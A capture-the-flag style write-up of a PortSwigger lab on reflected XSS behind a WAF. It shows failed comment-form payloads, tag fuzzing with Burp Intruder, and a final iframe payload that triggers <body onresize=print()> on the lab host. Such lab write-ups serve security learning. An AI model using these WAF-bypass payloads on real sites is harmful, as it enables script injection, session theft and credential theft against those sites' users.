# Reflected XSS into HTML context with most tags and attributes blocked

**Source:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
**Category:** XSS  
**Difficulty:** PRACTITIONER

## Objective
To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the `print()` function.

## Vulnerability
This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

## Exploitation

### Steps
1. Entered the lab, there is both a search form and a comment form on the blog post.
2. Started by testing the comment form because of the `Website` field, submitted the following form:

```text
Comment:
Got ya!

Name:
Test

Email:
carlos.hacker@gmail.com

Website:
https://google.com" onload="print()

```

Comment submitted but lab not solved.

3. Submitted the form again, this time looking for a vulnerability through `Comment`:

```text
Comment:
<svg onload="print()">

Name:
Test

Email:
carlos.hacker@gmail.com

Website:
https://google.com

```

Comment submitted but lab not solved.

4. Another attempt with `Comment` but with the value `<body onresize="print()">`. Comment submitted but lab not solved.

5. Switched to Burp Suite and captured the search form request and sent it to Intruder. Set the payload to the value `test`:

```http
GET /?search=<test> HTTP/2
```

Then went to the [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), copied the tags and pasted them into the payload, ran the attack.

The `<body>` and `xss` tags returned `Status code 200` - here we have our vulnerability.

6. Attempted to send the search form with the following values:
- `<body onload="print()">` - "Attribute is not allowed"
- `<body onerror="print()">` - "Attribute is not allowed"
- `<body onfocus="print()">` - "Attribute is not allowed"
- `<body onmouseover="print()">` - "Attribute is not allowed"
- `<body onclick="print()">` - "Attribute is not allowed"
- `<body onkeydown="print()">` - "Attribute is not allowed"
- `<body onscroll="print()">` - "Attribute is not allowed"
- `<body onresize="print()">` - Refreshed the page instead of showing an error

After refreshing the page and resizing the browser window, the script executed.

7. Went to the `exploit server` and sent the form with the following `Body` value:
```http
<iframe src="https://0abb0051032eb3558184431500d7004f.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload="this.style.width='100px'"></iframe>
```


### Payload
```html
<iframe src="https://0abb0051032eb3558184431500d7004f.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload="this.style.width='100px'"></iframe>
```

### Shortcut
1. Go to Exploit Server.
2. Paste the payload in the Body section.
3. Click "Store".
4. Click "Deliver exploit to victim".

## Impact
An attacker could execute arbitrary JavaScript in the victim's browser, potentially leading to session hijacking, credential theft, or page defacement.

## Mitigation
Encode all user input before reflecting it in HTML responses, and implement a properly configured WAF that blocks all dangerous tags and events.

## Tools
- Browser
- Burp Suite
- Intruder
- Exploit Server

## Notes
The WAF blocks most tags and attributes, but allows `<body>` and `onresize`. The vulnerability is exploited by using an iframe to automatically trigger the `onresize` event without user interaction.